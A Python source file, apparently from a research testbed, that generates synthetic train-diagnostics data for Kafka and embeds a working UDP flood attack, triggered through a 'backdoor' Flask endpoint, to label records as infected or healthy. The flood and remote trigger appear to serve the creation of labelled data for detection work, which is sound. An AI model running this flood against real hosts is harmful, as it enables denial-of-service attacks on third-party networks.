import pandas as pd
import numpy as np
import time
from scipy.stats import lognorm
import pickle
import threading
import time
from confluent_kafka import SerializingProducer
from confluent_kafka.serialization import StringSerializer
import logging
import json
import argparse
import signal
from train_monitor import TrainMonitor
import os
import requests
import subprocess
from flask import Flask, request, jsonify
import socket
import yaml


class Attack:
    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
        """
        Crea un attaccante UDP per eseguire un flood su un target.

        Parametri:
        - target_ip: IP di destinazione
        - target_port: Porta di destinazione (default: 80)
        - duration: Durata dell'attacco in secondi (default: 60)
        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.delay = delay
        


    def attack_condition(self):
        if self.duration == 0:
            return self.alive
        else:
            return self.alive and (time.time() < self.end_time)


    def start_attack(self):
        """
        Esegui un attacco UDP flood sul target specificato.
        """
        # Crea il socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Crea dati casuali per il pacchetto
        data = os.urandom(self.packet_size)
        
        packets_sent = 0
        bytes_sent = 0
        start_time = time.time()
        self.end_time = start_time + self.duration

        logger.info(f"[BOT] Starting UDP flood to {self.target_ip}:{self.target_port}")
        if self.duration != 0:
            logger.debug(f"[BOT] Test will run for {self.duration} seconds")
        else:
            logger.debug(f"[BOT] Attack will continue until stopped by user.")

        logger.debug(f"[BOT] Packet size: {self.packet_size} bytes")

        try:
            self.alive = True
            while self.attack_condition():
                sock.sendto(data, (self.target_ip, self.target_port))
                packets_sent += 1
                bytes_sent += self.packet_size

                # Stampa le statistiche ogni 10000 pacchetti
                if packets_sent % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
                    logger.info(f"[BOT] Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")

                # Aggiungi un ritardo tra i pacchetti se specificato
                if self.delay > 0:
                    time.sleep(self.delay)

        except Exception:
            logger.debug("[BOT] Attack stopped unexpectedly!")

        finally:
            # Chiudi il socket
            sock.close()

            # Stampa le statistiche finali
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0

            logger.info("[BOT] Attack ended")
            logger.debug(f"[BOT] Duration: {elapsed:.2f} seconds")
            logger.debug(f"[BOT] Packets sent: {packets_sent}")
            logger.debug(f"[BOT] Data sent: {bytes_sent/1000000:.2f} MB")
            logger.debug(f"[BOT] Rate: {rate:.2f} packets per second")
            logger.debug(f"[BOT] Throughput: {mbps:.2f} Mbps")


# Create a lock object
lock = threading.Lock()

def synchronized(lock):
    """ Synchronization decorator. """
    def wrapper(f):
        def wrapped(*args, **kwargs):
            with lock:
                return f(*args, **kwargs)
        return wrapped
    return wrapper


# load the copula objects later:
with open('copula_anomalie.pkl', 'rb') as f:
    copula_anomalie = pickle.load(f)

with open('copula_normali.pkl', 'rb') as f:
    copula_normali = pickle.load(f)

produced_records = 0
produced_anomalies = 0
produced_diagnostics = 0
stop_threads = False
anomaly_generators = {}
diagnostics_generators = {}

HOST_IP = os.getenv("HOST_IP")

# load the probabilities of the classes:
anomaly_probabilities = pd.read_csv('generators/anomaly_cluster_probabilities.csv')
diagnostics_probabilities = pd.read_csv('generators/diagnostics_cluster_probabilities.csv')

# Constants:
columns_to_generate = [
    'Durata', 'CabEnabled_M1', 'CabEnabled_M8', 'ERTMS_PiastraSts', 'HMI_ACPntSts_T2', 'HMI_ACPntSts_T7',
    'HMI_DCPntSts_T2', 'HMI_DCPntSts_T7', 'HMI_Iline', 'HMI_Irsts_T2', 'HMI_Irsts_T7', 'HMI_VBatt_T2',
    'HMI_VBatt_T4', 'HMI_VBatt_T5', 'HMI_VBatt_T7', 'HMI_Vline', 'HMI_impSIL', 'LineVoltType', 'MDS_LedLimVel',
    'MDS_StatoMarcia', '_GPS_LAT', '_GPS_LON', 'ldvvelimps', 'ldvveltreno', 'usB1BCilPres_M1', 'usB1BCilPres_M3',
    'usB1BCilPres_M6', 'usB1BCilPres_M8', 'usB1BCilPres_T2', 'usB1BCilPres_T4', 'usB1BCilPres_T5', 'usB1BCilPres_T7',
    'usB2BCilPres_M1', 'usB2BCilPres_M3', 'usB2BCilPres_M6', 'usB2BCilPres_M8', 'usB2BCilPres_T2', 'usB2BCilPres_T4',
    'usB2BCilPres_T5', 'usB2BCilPres_T7', 'usBpPres', 'usMpPres'
]

all_columns = [
    'Flotta', 'Veicolo', 'Codice', 'Nome', 'Descrizione', 'Test', 'Timestamp', 'Timestamp chiusura', 'Durata', 
    'Posizione', 'Sistema', 'Componente', 'Latitudine', 'Longitudine', 'Contemporaneo', 'Timestamp segnale'
] + columns_to_generate + ['Tipo_Evento', 'Tipo_Evento_Classificato']


def parse_str_list(arg):
    # Split the input string by commas and convert each element to int
    try:
        return [str(x) for x in arg.split(',')]
    except ValueError:
        raise argparse.ArgumentTypeError("Arguments must be strings separated by commas")
    

def parse_int_list(arg):
    # Split the input string by commas and convert each element to int
    try:
        return [int(x) for x in arg.split(',')]
    except ValueError:
        raise argparse.ArgumentTypeError("Arguments must be integers separated by commas")


@synchronized(lock)
def produce_message(data, topic_name):
    global produced_records
    """
    Produce a message to Kafka for a specific sensor type.

    Args:
        data (dict): The data to be sent as a message.
        topic_name (str): The Kafka topic to which the message will be sent.
    """
    try:
        producer.produce(topic=topic_name, value=data)  # Send the message to Kafka
        if topic_name.endswith('HEALTH'):
            pass
        else:
            produced_records += 1

        if produced_records % 50 == 0:
            producer.flush()
        if produced_records % 100 == 0:
            logger.info(f"sent {produced_records} records for now. {produced_anomalies} anomalies and {produced_diagnostics} diagnostics.")
    except Exception as e:
        print(f"Error while producing message to {topic_name} : {e}")


def sample_anomaly_from_global():
    return -1, copula_anomalie.sample(1)


def sample_anomaly_from_clusters():
    cluster_to_sample_from = np.random.choice(
        anomaly_probabilities['cluster'],
        size=1, 
        p=anomaly_probabilities['probability'])
    return cluster_to_sample_from[0], anomaly_generators[cluster_to_sample_from[0]].sample(1)


def health_probes_thread(args):
    logger.info(f"Starting thread for health probes for vehicle: {VEHICLE_NAME}")
    while not stop_threads:
        health_dict = train_monitor.probe_health()
        produce_message(
            data=health_dict, 
            topic_name=f"{VEHICLE_NAME}_HEALTH")
        time.sleep(args.probe_frequency_seconds)


def thread_anomalie(args):
    global produced_anomalies, attack_lock
    logger.info(f"Starting thread for anomalies generation for vehicle: {VEHICLE_NAME}")
    media_durata_anomalie = args.mu_anomalies * args.alpha
    sigma_anomalie = 1 * args.beta
    lognormal_anomalie = lognorm(s=sigma_anomalie, scale=np.exp(np.log(media_durata_anomalie)))
    topic_name = f"{VEHICLE_NAME}_anomalies"

    if args.anomaly_classes == list(range(0,19)):
        sample_anomaly_function = sample_anomaly_from_global
    else:
        sample_anomaly_function = sample_anomaly_from_clusters

    while not stop_threads:
        cluster, synthetic_anomalie = sample_anomaly_function()
        durata_anomalia = lognormal_anomalie.rvs(size=1)
        synthetic_anomalie['Durata'] = durata_anomalia
        synthetic_anomalie['Flotta'] = 'ETR700'
        synthetic_anomalie['Veicolo'] = VEHICLE_NAME
        synthetic_anomalie['Test'] = 'N'
        synthetic_anomalie['Timestamp'] = pd.Timestamp.now()
        synthetic_anomalie['Timestamp chiusura'] = synthetic_anomalie['Timestamp'] + pd.to_timedelta(synthetic_anomalie['Durata'], unit='s')
        synthetic_anomalie['Posizione'] = np.nan
        synthetic_anomalie['Sistema'] = 'VEHICLE'
        synthetic_anomalie['Componente'] = 'VEHICLE'
        synthetic_anomalie['Timestamp segnale'] = np.nan

        for col in all_columns:
            if col not in synthetic_anomalie.columns:
                synthetic_anomalie[col] = np.nan

        synthetic_anomalie = synthetic_anomalie.round(2)
        synthetic_anomalie = synthetic_anomalie[all_columns]
        
        data_to_send = synthetic_anomalie.iloc[0].to_dict()
        data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
        data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
        data_to_send['cluster'] = str(cluster)

        if mode == 'SW':
            with attack_lock:
                health_dict = train_monitor.probe_health()
                attack_label = get_status_robust()
                data_to_send.update(health_dict)
                data_to_send['node_status'] = attack_label
            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
        
        produced_anomalies += 1
        produce_message(data_to_send, topic_name)
        if args.time_emulation:
            time.sleep(durata_anomalia[0])


def sample_normal_from_global():
    return -1, copula_normali.sample(1)


def sample_normal_from_clusters():
    cluster_to_sample_from = np.random.choice(
        diagnostics_probabilities['cluster'],
        size=1, 
        p=diagnostics_probabilities['probability'])
    return cluster_to_sample_from[0], diagnostics_generators[cluster_to_sample_from[0]].sample(1)


def thread_normali(args):
    global produced_diagnostics, attack_lock
    logger.info(f"Starting thread for normal data generation for vehicle: {VEHICLE_NAME}")
    media_durata_normali = args.mu_normal * args.alpha
    sigma_normali = 1 * args.beta
    lognormal_normali = lognorm(s=sigma_normali, scale=np.exp(np.log(media_durata_normali)))
    topic_name = f"{VEHICLE_NAME}_normal_data"

    if args.diagnostics_classes == list(range(0,15)):
        sample_normal_function = sample_normal_from_global
    else:
        sample_normal_function = sample_normal_from_clusters

    while not stop_threads:
        cluster, synthetic_normali = sample_normal_function()
        durata_normale = lognormal_normali.rvs(size=1)
        synthetic_normali['Durata'] = durata_normale
        synthetic_normali['Flotta'] = 'ETR700'
        synthetic_normali['Veicolo'] = VEHICLE_NAME
        synthetic_normali['Test'] = 'N'
        synthetic_normali['Timestamp'] = pd.Timestamp.now()
        synthetic_normali['Timestamp chiusura'] = synthetic_normali['Timestamp'] + pd.to_timedelta(synthetic_normali['Durata'], unit='s')
        synthetic_normali['Posizione'] = np.nan
        synthetic_normali['Sistema'] = 'VEHICLE'
        synthetic_normali['Componente'] = 'VEHICLE'
        synthetic_normali['Timestamp segnale'] = np.nan

        for col in all_columns:
            if col not in synthetic_normali.columns:
                synthetic_normali[col] = np.nan

        synthetic_normali = synthetic_normali.round(2)
        synthetic_normali = synthetic_normali[all_columns]
        # print(f"Nuova diagnostica generata: {synthetic_normali}")
        # Convert data to JSON and send it to Kafka
        data_to_send = synthetic_normali.iloc[0].to_dict()
        data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
        data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
        data_to_send['cluster'] = str(cluster)
        
        if mode == 'SW':
            with attack_lock:
                health_dict = train_monitor.probe_health()
                attack_label = get_status_robust()
                data_to_send.update(health_dict)
                data_to_send['node_status'] = attack_label
            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")

        produce_message(data_to_send, topic_name)
        produced_diagnostics += 1
        if args.time_emulation:
            time.sleep(durata_normale[0])


def get_status_from_manager(vehicle_name):
    url = f"http://{HOST_IP}:{MANAGER_PORT}/vehicle-status"
    data = {"vehicle_name": vehicle_name}
    response = requests.post(url, json=data)
    logger.debug(f"Vehicle-status Response Status Code: {response.status_code}")
    logger.debug(f"Vehicle-status Response Body: {response.text}")
    return response.text


def get_status_locally():
    pid_request_command = 'pgrep -f attack.py'
    # issue command in this host
    pid_result = subprocess.run(pid_request_command, shell=True, stdout=subprocess.PIPE)
    if pid_result.returncode == 0:
        return 'INFECTED'
    else:
        return 'HEALTHY'


def get_status_robust():    
    return 'INFECTED' if UNDER_ATTACK else 'HEALTHY'


def adjust_probability(index, probability, main_classes, main_prob, low_prob):
    """
    Normalize the probabilities of classes based on given classes.
    This function adjusts the probabilities of classes by separating them into
    "main classes" (the ones specified in the config file)
    and "low probability classes" (the rest). The first group will have the 80% of probability,
    while the second group will have the remaining 20% of probability.
    """
    if index in main_classes:
        return probability * 0.8 / main_prob
    else:
        return probability * 0.2 / low_prob


def normalize_anomaly_probabilities(anomaly_classes):
    global anomaly_probabilities
    low_prob_classes = [x for x in range(0,19) if x not in anomaly_classes]
    
    main_anomaly_probabilities = anomaly_probabilities[anomaly_probabilities.index.isin(anomaly_classes)]
    main_prob = main_anomaly_probabilities['probability'].sum()

    low_anomaly_probabilities = anomaly_probabilities[anomaly_probabilities.index.isin(low_prob_classes)]
    low_prob = low_anomaly_probabilities['probability'].sum()

    anomaly_probabilities['probability'] = anomaly_probabilities.apply(
        lambda row: adjust_probability(
            row.name, row['probability'], anomaly_classes, main_prob, low_prob), axis=1)


def normalize_diagnostics_probabilities(diagnostics_classes):
    global diagnostics_probabilities
    low_prob_classes = [x for x in range(0,15) if x not in diagnostics_classes]
    # Filter for the subset of clusters
    main_diagnostics_probabilities = diagnostics_probabilities[diagnostics_probabilities.index.isin(diagnostics_classes)]
    main_prob = main_diagnostics_probabilities['probability'].sum()

    low_diagnostics_probabilities = diagnostics_probabilities[diagnostics_probabilities.index.isin(low_prob_classes)]
    low_prob = low_diagnostics_probabilities['probability'].sum()

    diagnostics_probabilities['probability'] = diagnostics_probabilities.apply(
        lambda row: adjust_probability(
            row.name, row['probability'], diagnostics_classes, main_prob, low_prob), axis=1)


def get_anomaly_generators_dict(anomaly_classes):
    normalize_anomaly_probabilities(anomaly_classes)
    anomaly_generators = {}
    for anomaly_class in range(0,19):
        with open(f'generators/anomalies/copula_anomalie_cluster_{anomaly_class}.pkl', 'rb') as f:
            anomaly_generators[anomaly_class] = pickle.load(f)
    return anomaly_generators


def get_diagnostics_generators_dict(diagnostics_classes):
    normalize_diagnostics_probabilities(diagnostics_classes)
    diagnostics_generators = {}
    for diagnostics_class in range(0,15):
        with open(f'generators/diagnostics/copula_normal_cluster_{diagnostics_class}.pkl', 'rb') as f:
            diagnostics_generators[diagnostics_class] = pickle.load(f)
    return diagnostics_generators


def signal_handler(sig, frame):
    global stop_threads
    logger.debug(f"Received signal {sig}. Gracefully stopping {VEHICLE_NAME} producer.")
    stop_threads = True


def configure_no_proxy():
    os.environ['no_proxy'] = os.environ.get('no_proxy', '') + f",{HOST_IP}"


# Global state for API management
api_config = {}
api_running = False
api_threads = []
api_lock = threading.Lock()

def load_config_from_environment():
    """Load configuration from environment variables"""
    config = {
        'vehicle_name': os.getenv('VEHICLE_NAME'),
        'kafka_broker': os.getenv('KAFKA_BROKER', 'kafka:9092'),
        'logging_level': os.getenv('LOGGING_LEVEL', 'INFO'),
        'manager_port': int(os.getenv('MANAGER_PORT', '5000')),
        'mode': os.getenv('MODE', 'OF'),
        
        # Network configuration
        'target_ip': os.getenv('TARGET_IP', '172.18.0.4'),
        'target_port': int(os.getenv('TARGET_PORT', '80')),
        'bot_port': int(os.getenv('BOT_PORT', '5002')),
        
        # Timing parameters
        'probe_frequency_seconds': float(os.getenv('PROBE_FREQUENCY_SECONDS', '2')),
        'ping_thread_timeout': float(os.getenv('PING_THREAD_TIMEOUT', '5')),
        'ping_host': os.getenv('PING_HOST', 'www.google.com'),
        
        # Attack parameters
        'duration': int(os.getenv('DURATION', '0')),
        'packet_size': int(os.getenv('PACKET_SIZE', '1024')),
        'delay': float(os.getenv('DELAY', '0.001')),
        
        # Data generation parameters
        'mu_anomalies': float(os.getenv('MU_ANOMALIES', '157')),
        'mu_normal': float(os.getenv('MU_NORMAL', '115')),
        'alpha': float(os.getenv('ALPHA', '0.2')),
        'beta': float(os.getenv('BETA', '1.9')),
        'time_emulation': os.getenv('TIME_EMULATION', 'false').lower() == 'true',
        
        # Probe metrics
        'probe_metrics': os.getenv('PROBE_METRICS', 'RTT,INBOUND,OUTBOUND,CPU,MEM').split(','),
        
        # Default anomaly and diagnostics classes
        'anomaly_classes': list(range(0, 19)),
        'diagnostics_classes': list(range(0, 15))
    }
    
    # Validate required environment variables
    if not config['vehicle_name']:
        raise ValueError("VEHICLE_NAME environment variable must be set")
    
    return config

def load_config_from_file(config_path='/app/config.yaml'):
    """Load configuration from YAML file"""
    try:
        with open(config_path, 'r') as f:
            file_config = yaml.safe_load(f)
        
        # Convert file config to our format
        config = {}
        
        if 'vehicle' in file_config:
            config['vehicle_name'] = file_config['vehicle'].get('name')
        
        if 'data_generation' in file_config:
            dg = file_config['data_generation']
            config.update({
                'mu_anomalies': dg.get('mu_anomalies', 157),
                'mu_normal': dg.get('mu_normal', 115),
                'alpha': dg.get('alpha', 0.2),
                'beta': dg.get('beta', 1.9),
                'time_emulation': dg.get('time_emulation', False),
                'anomaly_classes': dg.get('anomaly_classes', list(range(0, 19))),
                'diagnostics_classes': dg.get('diagnostics_classes', list(range(0, 15)))
            })
        
        if 'probe' in file_config:
            probe = file_config['probe']
            config.update({
                'probe_frequency_seconds': probe.get('frequency_seconds', 2),
                'ping_thread_timeout': probe.get('timeout', 5),
                'ping_host': probe.get('host', 'www.google.com'),
                'probe_metrics': probe.get('metrics', ['RTT', 'INBOUND', 'OUTBOUND', 'CPU', 'MEM'])
            })
        
        if 'attack' in file_config:
            attack = file_config['attack']
            config.update({
                'target_ip': attack.get('target_ip', '172.18.0.4'),
                'target_port': attack.get('target_port', 80),
                'duration': attack.get('duration', 0),
                'packet_size': attack.get('packet_size', 1024),
                'delay': attack.get('delay', 0.001),
                'bot_port': attack.get('bot_port', 5002)
            })
        
        if 'system' in file_config:
            system = file_config['system']
            config.update({
                'mode': system.get('mode', 'OF'),
                'logging_level': system.get('logging_level', 'INFO'),
                'manager_port': system.get('manager_port', 5000)
            })
        
        return config
    except FileNotFoundError:
        print(f"Config file {config_path} not found, using environment variables only")
        return {}
    except yaml.YAMLError as e:
        print(f"Error parsing config file: {e}")
        return {}

def merge_configs(env_config, file_config):
    """Merge environment and file configurations, with environment taking precedence"""
    merged = env_config.copy()
    
    # Override with file config values (if not set in environment)
    for key, value in file_config.items():
        if key not in merged or merged[key] is None:
            merged[key] = value
    
    return merged

def validate_config(config):
    """Validate configuration parameters"""
    # Check required fields
    required_fields = ['vehicle_name', 'kafka_broker']
    for field in required_fields:
        if not config.get(field):
            raise ValueError(f"Missing required configuration field: {field}")
    
    # Validate numeric ranges
    if not (0 < config.get('mu_anomalies', 0) < 1000):
        raise ValueError("mu_anomalies must be between 0 and 1000")
    
    if not (0 < config.get('mu_normal', 0) < 1000):
        raise ValueError("mu_normal must be between 0 and 1000")
    
    if not (0 < config.get('alpha', 0) < 10):
        raise ValueError("alpha must be between 0 and 10")
    
    if not (0 < config.get('beta', 0) < 10):
        raise ValueError("beta must be between 0 and 10")
    
    # Validate port numbers
    if not (1 <= config.get('target_port', 0) <= 65535):
        raise ValueError("target_port must be between 1 and 65535")
    
    if not (1 <= config.get('bot_port', 0) <= 65535):
        raise ValueError("bot_port must be between 1 and 65535")
    
    return True

def start_producer_threads(config):
    """Start producer threads with configuration"""
    global api_threads, api_running, anomaly_generators, diagnostics_generators
    
    with api_lock:
        if api_running:
            return False, "Producer is already running"
        
        # Create thread arguments from config
        thread_args = argparse.Namespace(
            mu_anomalies=config['mu_anomalies'],
            mu_normal=config['mu_normal'],
            alpha=config['alpha'],
            beta=config['beta'],
            anomaly_classes=config['anomaly_classes'],
            diagnostics_classes=config['diagnostics_classes'],
            time_emulation=config['time_emulation'],
            probe_frequency_seconds=config['probe_frequency_seconds'],
            ping_thread_timeout=config['ping_thread_timeout'],
            ping_host=config['ping_host'],
            probe_metrics=config['probe_metrics']
        )
        
        # Ensure generators are loaded based on current config
        if thread_args.anomaly_classes != list(range(0, 19)):
            anomaly_generators = get_anomaly_generators_dict(thread_args.anomaly_classes)
        if thread_args.diagnostics_classes != list(range(0, 15)):
            diagnostics_generators = get_diagnostics_generators_dict(thread_args.diagnostics_classes)

        # Start threads
        anomaly_thread = threading.Thread(target=thread_anomalie, args=(thread_args,))
        diagnostics_thread = threading.Thread(target=thread_normali, args=(thread_args,))
        
        anomaly_thread.daemon = True
        diagnostics_thread.daemon = True
        
        anomaly_thread.start()
        diagnostics_thread.start()
        
        api_threads = [anomaly_thread, diagnostics_thread]
        api_running = True
        
        return True, "Producer started successfully"

def stop_producer_threads():
    """Stop all producer threads"""
    global stop_threads, api_threads, api_running
    
    with api_lock:
        if not api_running:
            return False, "Producer is not running"
        
        stop_threads = True
        
        for thread in api_threads:
            thread.join(timeout=5)
        
        api_threads = []
        api_running = False
        stop_threads = False  # Reset for next start
        
        return True, "Producer stopped successfully"

def create_flask_app():
    """Create and configure Flask app with API endpoints"""
    app = Flask(__name__)
    
    @app.route('/configure', methods=['POST'])
    def configure():
        """Configure the producer with new settings"""
        global api_config
        
        try:
            new_config = request.json
            if not new_config:
                return jsonify({"error": "No configuration provided"}), 400
            
            # Validate the new configuration
            validate_config(new_config)
            
            # Update configuration
            with api_lock:
                api_config.update(new_config)
            
            # Save to file for persistence
            try:
                config_to_save = {
                    'vehicle': {'name': new_config.get('vehicle_name')},
                    'data_generation': {
                        'mu_anomalies': new_config.get('mu_anomalies', 157),
                        'mu_normal': new_config.get('mu_normal', 115),
                        'alpha': new_config.get('alpha', 0.2),
                        'beta': new_config.get('beta', 1.9),
                        'time_emulation': new_config.get('time_emulation', False),
                        'anomaly_classes': new_config.get('anomaly_classes', list(range(0, 19))),
                        'diagnostics_classes': new_config.get('diagnostics_classes', list(range(0, 15)))
                    },
                    'probe': {
                        'frequency_seconds': new_config.get('probe_frequency_seconds', 2),
                        'timeout': new_config.get('ping_thread_timeout', 5),
                        'host': new_config.get('ping_host', 'www.google.com'),
                        'metrics': new_config.get('probe_metrics', ['RTT', 'INBOUND', 'OUTBOUND', 'CPU', 'MEM'])
                    },
                    'attack': {
                        'target_ip': new_config.get('target_ip', '172.18.0.4'),
                        'target_port': new_config.get('target_port', 80),
                        'duration': new_config.get('duration', 0),
                        'packet_size': new_config.get('packet_size', 1024),
                        'delay': new_config.get('delay', 0.001),
                        'bot_port': new_config.get('bot_port', 5002)
                    },
                    'system': {
                        'mode': new_config.get('mode', 'OF'),
                        'logging_level': new_config.get('logging_level', 'INFO'),
                        'manager_port': new_config.get('manager_port', 5000)
                    }
                }
                
                with open('/app/config.yaml', 'w') as f:
                    yaml.dump(config_to_save, f)
            except Exception as e:
                logger.warning(f"Could not save config to file: {e}")
            
            return jsonify({
                "status": "configured",
                "config": api_config
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 400

    @app.route('/start', methods=['POST'])
    def start_producer():
        """Start the producer with current configuration"""
        try:
            if not api_config:
                return jsonify({"error": "Not configured"}), 400
            
            success, message = start_producer_threads(api_config)
            if success:
                return jsonify({
                    "status": "started",
                    "vehicle": api_config.get('vehicle_name'),
                    "message": message
                })
            else:
                return jsonify({"error": message}), 400
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route('/stop', methods=['POST'])
    def stop_producer():
        """Stop the producer"""
        try:
            success, message = stop_producer_threads()
            # Make this endpoint idempotent: return 200 even if already stopped
            if success:
                return jsonify({"status": "stopped", "message": message})
            else:
                # Normalize message and respond 200 if it's just not running
                normalized = str(message).lower()
                if "not running" in normalized or "already" in normalized:
                    return jsonify({"status": "already_stopped", "message": message})
                return jsonify({"error": message}), 400
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route('/status', methods=['GET'])
    def get_status():
        """Get current status and statistics"""
        return jsonify({
            "running": api_running,
            "vehicle": api_config.get('vehicle_name'),
            "records_produced": produced_records,
            "anomalies_produced": produced_anomalies,
            "diagnostics_produced": produced_diagnostics,
            "under_attack": UNDER_ATTACK,
            "config": api_config
        })

    @app.route('/health', methods=['GET'])
    def health_check():
        """Health check endpoint"""
        return jsonify({
            "status": "healthy",
            "running": api_running,
            "config_loaded": bool(api_config),
            "vehicle": api_config.get('vehicle_name', 'unknown')
        })

    @app.route('/config', methods=['GET'])
    def get_config():
        """Get current configuration"""
        return jsonify(api_config)

    @app.route('/config', methods=['PUT'])
    def update_config():
        """Update specific configuration parameters"""
        global api_config
        
        try:
            updates = request.json
            if not updates:
                return jsonify({"error": "No updates provided"}), 400
            
            # Validate updates
            test_config = api_config.copy()
            test_config.update(updates)
            validate_config(test_config)
            
            # Apply updates
            with api_lock:
                api_config.update(updates)
            
            return jsonify({
                "status": "updated",
                "config": api_config
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 400

    return app

def main():
    global VEHICLE_NAME, MANAGER_PORT, UNDER_ATTACK, attack_lock
    global producer, logger, anomaly_generators, diagnostics_generators
    global anomaly_thread, diagnostics_thread, stop_threads, train_monitor, mode
    global api_config

    # Load configuration from environment variables
    env_config = load_config_from_environment()
    
    # Load configuration from file
    file_config = load_config_from_file()
    
    # Merge configurations
    config = merge_configs(env_config, file_config)
    
    # Validate configuration
    try:
        validate_config(config)
    except ValueError as e:
        print(f"Configuration error: {e}")
        return 1
    
    # Set global variables from config
    VEHICLE_NAME = config['vehicle_name']
    MANAGER_PORT = config['manager_port']
    UNDER_ATTACK = False
    mode = config['mode']
    
    # Store config for API
    api_config = config.copy()

    # Configure logging
    logging.basicConfig(
        format='%(name)s-%(levelname)s-%(message)s', 
        level=str(config['logging_level']).upper()
    )
    logger = logging.getLogger(f'[{VEHICLE_NAME}_PROD]')
    
    # Log configuration summary
    logger.info(f"Starting producer for vehicle: {VEHICLE_NAME}")
    logger.info(f"Mode: {mode}")
    logger.info(f"Kafka broker: {config['kafka_broker']}")
    logger.info(f"Manager port: {config['manager_port']}")
    
    # Configure no proxy if needed
    if os.getenv('no_proxy_host'):
        configure_no_proxy()
    
    # Create Kafka producer
    conf_prod = {
        'bootstrap.servers': config['kafka_broker'],
        'key.serializer': StringSerializer('utf_8'),
        'value.serializer': lambda x, ctx: json.dumps(x).encode('utf-8')
    }
    producer = SerializingProducer(conf_prod)

    # Create attack object
    attack_lock = threading.Lock()
    attack = Attack(
        target_ip=config['target_ip'],
        target_port=config['target_port'],
        duration=config['duration'],
        packet_size=config['packet_size'],
        delay=config['delay']
    )

    logger.info(f"Setting up producing threads for vehicle: {VEHICLE_NAME}")
    
    # Load generators if needed
    if config['anomaly_classes'] != list(range(0, 19)):
        anomaly_generators = get_anomaly_generators_dict(config['anomaly_classes'])
    if config['diagnostics_classes'] != list(range(0, 15)):
        diagnostics_generators = get_diagnostics_generators_dict(config['diagnostics_classes'])

    # Create train monitor
    train_monitor = TrainMonitor(argparse.Namespace(**config))

    # Create Flask app for API
    app = create_flask_app()
    
    # Create Flask app for backdoor (existing functionality)
    backdoor_app = Flask(f'{VEHICLE_NAME}_backdoor')
    
    @backdoor_app.route('/start-attack', methods=['POST'])
    def start_attack():
        global UNDER_ATTACK, attack_thread
        
        with attack_lock:
            if not UNDER_ATTACK:
                attack_thread = threading.Thread(target=attack.start_attack)
                attack_thread.daemon = True
                attack_thread.start()
                UNDER_ATTACK = True
                train_monitor.reset()
                return 'Attack launched', 200
            else:
                return 'Already under attack!!', 400
    
    @backdoor_app.route('/stop-attack', methods=['POST'])
    def stop_attack():
        global UNDER_ATTACK, attack_thread
        with attack_lock:
            if UNDER_ATTACK:
                attack.alive = False
                attack_thread.join(1)
                UNDER_ATTACK = False
                train_monitor.reset()
                return 'Attack stopped', 200
            else:
                return 'Wasn\'t under attack!!', 400

    # Start Flask threads
    api_thread = threading.Thread(
        target=app.run, 
        kwargs={'host': '0.0.0.0', 'port': 5000, 'debug': False}
    )
    api_thread.daemon = True
    api_thread.start()
    logger.info(f"Producer API started on port 5000")
    
    backdoor_thread = threading.Thread(
        target=backdoor_app.run, 
        kwargs={'host': '0.0.0.0', 'port': config['bot_port']}
    )
    backdoor_thread.daemon = True
    backdoor_thread.start()
    logger.info(f"Backdoor installed at {config['bot_port']}")
    
    # Suppress Flask logs
    flask_logger = logging.getLogger('werkzeug')
    flask_logger.name = f"[{VEHICLE_NAME}_BOT]"
    def custom_handle(record):
        return
    flask_logger.handle = custom_handle

    # Set up signal handlers
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame))
    
    # Main loop
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down producer...")
        stop_producer_threads()

if __name__ == '__main__':
    main()